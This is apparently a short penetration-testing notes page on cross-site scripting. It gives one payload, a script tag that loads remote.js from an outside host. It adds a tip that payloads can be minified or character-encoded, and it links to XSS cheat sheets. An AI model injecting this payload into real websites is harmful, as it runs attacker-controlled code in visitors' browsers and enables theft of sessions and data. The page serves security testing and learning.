# XSS - Cross site scripting

### Remote JavaScript include

```text
<script src="http://domain.com/remote.js"></script>
```

 Depending on the context and length of the payload, it can sometimes be minified, encoded and submitted directly in the request.

Minifier tool: [https://javascript-minifier.com/](https://javascript-minifier.com/)

Character code encoding:[https://eve.gd/2007/05/23/string-fromcharcode-encoder/](https://eve.gd/2007/05/23/string-fromcharcode-encoder/)

Great resources:

{% embed url="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" caption="" %}

\[Payloadsallthethings XSS Cheatsheet\]\("[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS) Injection" "Payloads all the things XSS cheatsheet"\)

